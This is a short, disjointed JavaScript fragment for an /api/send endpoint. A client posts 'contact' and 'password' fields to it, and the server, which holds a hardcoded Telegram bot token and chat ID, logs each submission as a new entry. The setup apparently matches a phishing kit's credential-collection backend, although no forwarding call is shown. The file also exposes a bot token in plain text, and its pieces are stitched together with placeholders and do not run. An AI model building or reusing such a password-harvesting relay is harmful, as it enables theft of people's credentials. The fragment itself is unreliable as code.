module.exports = function handler(req, res) { ... }
POST /api/send
if (req.method !== 'POST') {
  return res.status(405).json({ ok: false });
}
const TELEGRAM_BOT_TOKEN = '8552207692:AAFi7UpOILDZby2mVSzxqRulX0YoC_NK8Q8';
const TELEGRAM_CHAT_ID = '355048434';
const body = req.body || {};
fetch('/api/send', {
  body: JSON.stringify({
    contact: "...",
    password: "..."
  })
})
console.log('Новая заявка:', body);
return res.status(200).json({ ok: true });
{ "ok": true }
